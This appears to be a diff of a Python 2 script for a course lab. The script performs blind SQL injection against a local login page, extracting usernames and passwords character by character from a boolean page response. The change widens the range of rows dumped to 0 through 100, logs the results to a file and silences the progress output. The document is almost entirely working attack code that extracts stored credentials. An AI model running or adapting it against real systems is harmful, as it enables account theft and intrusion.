@@ -17,7 +17,8 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 f= open("logs.txt","w+")
 listASCII=string.printable
 iterator=cycle(['username','password'])
-for row in xrange(95,101):
+for row in xrange(0,101):
+	f.write(str(row) + "    ")
 	for iter in xrange(0,2):
 		field=iterator.next()
 		print field
@@ -27,7 +28,7 @@ for row in xrange(95,101):
 			f = urllib.urlopen(request)
 			response = f.read()
 			if (response.find('cat.JPG')!=-1): 
-				print "found size : %s" %s
+				# print "found size : %s" %s
 				size = s
 				break
 		word=""
@@ -38,7 +39,7 @@ for row in xrange(95,101):
 				f = urllib.urlopen(request)
 				response = f.read()
 				if (response.find('cat.JPG')!=-1): 
-					print "found letter %s at position %d" %(listASCII[c],pos)
+					# print "found letter %s at position %d" %(listASCII[c],pos)
 					word += listASCII[c]
 					break
 		f.write(word)
